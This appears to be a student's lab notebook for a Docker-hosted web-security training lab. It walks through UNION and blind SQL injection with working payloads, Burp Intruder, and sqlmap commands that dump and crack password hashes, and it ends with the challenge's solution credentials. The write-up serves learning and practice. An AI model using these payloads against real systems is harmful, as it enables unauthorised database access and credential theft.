## Finding and Exploitation of common web vulnerabilities

### 🔵 PEH Docker lab setup and usage instructions:

    apt update
    apt upgrade
    apt install docker.io
    apt install docker-compose
if no running docker daemon then start it (assuming we have docker io / docker compose installed)

check status:  

    systemctl status docker  
start docker:  

    systemctl start docker (if required)
    docker-compose up
stop container:  

    ctrl c  
have docker run in the background use -d for detached mode:  
    
    docker-compose -d
to check what dockers are running:  
    
    docker ps -a  
to stop:

    docker-compose stop
to remove a container, look for container ID and remove:

    docker rm 02dfB1w20cdcd11ee
to remove all containers:

    docker -rm $(sudo docker ps -aq)

to reset the instance from browser when docker instances are live:

    localhost/init.php

#### Once PEH docker is installed, with ./permission.sh file set, run localhost from burpe browser.

---

### 🔴 SQL Injection - Introduction Injection 0x01:

#### Lab 0x01 UNION 

User search: jeremy presents username and email fields  
![image](https://github.com/user-attachments/assets/ff8b811f-0322-46f2-80f7-2bb05f3518b3)

When probing a new site, firstly understand what the function is providing. Begin by probing with common inputs ', ' ', example', " ", "example"  

Then move on to using **logical operators**  
jeremy' or 1=1#  
jeremy' or 1=1-- -  

if successful move to using **union select** and figuring out the amount of null values required to return a response  
jeremy' union select null#  
jeremy' union select null,null,null#  

the third null respondes with results, indicating it has selected three coloumns in the background, loaded more information but only presenting two for us to see.  
![image](https://github.com/user-attachments/assets/45806752-eb2c-4640-81ed-0ad1e6a8389b)

jeremy' union select null,null,version()#  
![image](https://github.com/user-attachments/assets/8f0e98a3-6470-461a-a92d-295c4392b99a)

**Expanding this to look at the table names from the database**  
jeremy' union select null,null,table_name from information_schema.tables#  

**Expand this to look at the collumn names from the database**  
jeremy' union select null,null,column_name from information_schema.columns#

**Now to look for Jeremys or other password from this database, we need to identify the table (injection0x01) his details belongs to using the tables query**  

jeremy' union select null,null,password from injection0x01#
![image](https://github.com/user-attachments/assets/2a90862c-613b-4c97-a679-ffd62e8710e4)

**Note for intergers, in siutations such as user has an ID - Rare, may need to look into this more**  
jeremy' union select null(int),null,null from injection0x01#  

for example we may require the usage below to work with some queries  
jeremy' union select username,1,passwords from injection0x01#  

**Cheat Sheet PortSwigger website for different SQL injection databases**  
<https://portswigger.net/web-security/sql-injection/cheat-sheet>  

---

### 🔴 SQL Injection - Blind Part 1 Injection 0x02:  

#### Lab 0x02 BLIND INJECTION  
Testing the behaviour of the application.  

* Target: adding the target url to reduce noise  
* Proxy/HTTP history: to view request and response  
* Repeater: send captured Request or Response traffic to view and manipulate. Items to look out for: Cookies, Content Length  

![image](https://github.com/user-attachments/assets/ce2c8585-3af9-41a2-aa8d-038d95f1e5ae)

#### Probe  
Here we attempt basic SQL changes in the POST:request data by probing the username section with url encoded jeremy' or 1=1# and testing it with other common formats, whilst also checking if the response content-length changes to a succesful one.  

#### SQLMAP (to help look for wins)  
After multiple failed attempts, we can move to a tool called sqlmap. From the clean Repeater:Request window with the working credentials. Copy and paste into a .txt file.  

![image](https://github.com/user-attachments/assets/d6f2b0f6-222b-476e-8e37-1886b81bcf91)  

    sqlmap -r sqltraining.txt

![image](https://github.com/user-attachments/assets/11632c30-c902-4740-9560-999972de3349)  

it looks like nothing from this captured POST request can be exploited based from these checks.

#### Check for other injections points  
After the POST:request is sent, we notice there is a GET:request containing cookies. This means it also has to be processed as well by the application. Taking note of the 'content length' of a successful Request, we can begin checking basic SQL injection queries with the cookie.  

![image](https://github.com/user-attachments/assets/88ab0d83-9b46-4846-ad32-86f7662fead8)

Here we have sucessfully manupilated the cookie section by injecting SQL into it, indicating this area is vulnerable.

### 🔴 SQL Injection - Blind Part 2 Injection 0x02: 

#### Lab 0x02 BLIND INJECTION  
We have now identified a Blind SQL injection, because the query is only changing the behaviour of the application. I.E the content-length or 'welcome' message when query is true. And through this we are able to exploit this behaviour to slowly extract data via True or False queries.  

#### 🔨 MANUAL Probe with SUBSTRING(string, start, length) <https://www.w3schools.com/jsref/jsref_substring.asp>  
From the manipulated query we can slowly extract data via adding substrings into the query. As seen below, 'a' is 1st of 1 length = 'a', if true it will return a positive content-length.
![image](https://github.com/user-attachments/assets/386375e9-3e35-4f88-9fd6-135b5c16d19a)  

'alex' is 1st of 3 length = 'ale'  
![image](https://github.com/user-attachments/assets/2e3add93-4bab-474c-9dfe-7d99f0313895)  

Extracting the SQL database version, by slowly iterating the length upwards as the version numbers match.  
![image](https://github.com/user-attachments/assets/7617e57e-4eef-47e3-a438-a549043a2d87)  

Exercise: Extracting the password for jessamy via blind injection is very manual, so therefore we will send it to Intruder to conduct a sniper attack  
![image](https://github.com/user-attachments/assets/fdb58a23-f339-4d8d-9b3d-8a7bda91eae3)  

Exercise: In intruder we have set our 'payload position' and custom payload configuration of strings to test in the selected position  
![image](https://github.com/user-attachments/assets/47ca1cae-0ace-49e9-8ad2-76d57c923110)  

Exercise: Here we find a unique length response paired with the Response recieved with a content-length:1027. Suggseting the character z exists. 
![image](https://github.com/user-attachments/assets/ab7bbb72-4b3f-4ffb-8057-3a38f20355c6)  

---

#### ⚒️ AUTOMATIC Probe with SQLMAP  

Grabbing the original GET request, we store it into a .txt file to be sacnned with 'sqlmap -r file.txt --level=2'  
![image](https://github.com/user-attachments/assets/6f72fcd0-2a69-4f8b-b2e5-df3518d3ad37)  

sqlmap -r file.txt --level=2> N encoding > Y Skip other payloads for other DBs Y > Y include level 1 and 2 risk one values > N Fuzzy test > N random integers > Y Null values > N other cookie sessions.  
![image](https://github.com/user-attachments/assets/85a05773-667b-4a59-988d-1948022b6f2b)  

sqlmap -r file.txt --level=2 --dump | identified md5 passwords hashes and performed a dictionary attack which cracked passwords from lab injection0x03 lol...  
![image](https://github.com/user-attachments/assets/0dff6d6c-e93e-4eb5-a0db-6757124a35ed)  

sqlmap -r file.txt --level=2 --dump -T injection0x02| for a faster -T scan of only the injection0x02 Table  
![image](https://github.com/user-attachments/assets/cf513f81-1da9-44ce-9869-6f8442000fae)  

---

### 🔴 SQL Injection - Challenge Injection 0x03:  
Table name examples: 
* injection0x03_products
* injection0x03_users

sucessfull content length: length25XX  
sucessfull content length: OR , AND 45XX  
unsuccessfull content length: 17XX  

basic SQL injection attack: Yes  
Senpai Knife Set' OR 1=1# / Senpai Knife Set' AND 1=1#  

basic UNION attack: Yes  
union works
Senpai Knife Set' union select null,null,null,null#  

Version discoverey: Yes  
version() 8.0.41
Senpai Knife Set' union select null,null,null,version()#  

Table List: Yes  
list tables:
Senpai Knife Set' union select null,null,null,table_name from information_schema.tables#  

Column list: Yes  
Senpai Knife Set' union select null,null,null,column_name from information_schema.columns#  

Found table named injection_0x03_users  
Password: Senpai Knife Set' union select null,null,null,password from injection0x03_users# | password: onigirigadaisuki  

Found username from injection_0x03_users  
Senpai Knife Set' union select null,null,null,username from injection0x03_users# | username: takeshi  

**problem solved.**  
**personal note:** finding the columns will determine what you can query in the tables.

